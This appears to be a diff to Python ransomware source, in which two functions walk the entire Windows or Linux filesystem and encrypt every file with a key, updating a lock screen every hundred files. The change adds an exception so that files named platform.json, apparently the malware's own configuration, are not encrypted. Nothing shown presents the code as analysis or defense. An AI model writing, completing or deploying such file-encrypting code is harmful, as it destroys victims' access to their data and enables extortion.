@@ -9,29 +9,35 @@ def allFilesW():
     counter = 0
     for root, dirs, files in os.walk('C:\\\\'):
         for directory in files:
-            try:
-                encryption.file_encryption(os.path.join(root, directory), KEY)
-                counter = counter + 1
-            except:
-                pass
-            finally:
-                if counter > 100:
-                    lock.update()
-                    counter = 0
+            if "platform.json" in os.path.join(root,directory):
+                pass    
+            else:
+                try:
+                    encryption.file_encryption(os.path.join(root, directory), KEY)
+                    counter = counter + 1
+                except:
+                    pass
+                finally:
+                    if counter > 100:
+                        lock.update()
+                        counter = 0
 
 def allFilesL():
     counter = 0
     for root, dirs, files in os.walk('/'):
         for directory in files:
-            try:
-                encryption.file_encryption(os.path.join(root, directory), KEY)
-                counter = counter + 1
-            except:
+            if "platform.json" in os.path.join(root, directory):
                 pass
-            finally:
-                if counter > 100:
-                    lock.update()
-                    counter = 0
+            else:
+                try:
+                    encryption.file_encryption(os.path.join(root, directory), KEY)
+                    counter = counter + 1
+                except:
+                    pass
+                finally:
+                    if counter > 100:
+                        lock.update()
+                        counter = 0
 
 def platform_info():
     with open("platform.json", "r") as pl:
